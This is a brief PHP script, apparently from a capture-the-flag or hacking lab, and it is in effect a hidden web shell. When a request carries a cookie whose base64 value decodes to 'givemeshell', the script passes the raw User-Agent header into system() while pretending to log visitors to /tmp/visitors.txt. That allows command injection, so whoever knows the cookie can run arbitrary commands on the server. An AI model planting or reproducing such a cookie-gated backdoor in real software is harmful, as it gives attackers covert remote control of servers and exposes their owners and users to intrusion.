<?php
	// Note : the webroot has some really poor uploads handling
	
        if(isset($_COOKIE["shell"])) {
                
                $key = base64_decode($_COOKIE["shell"]);
                
                if($key === "givemeshell")
                      system("echo ".$_SERVER['HTTP_USER_AGENT']." >> /tmp/visitors.txt");
                
        }       
?>
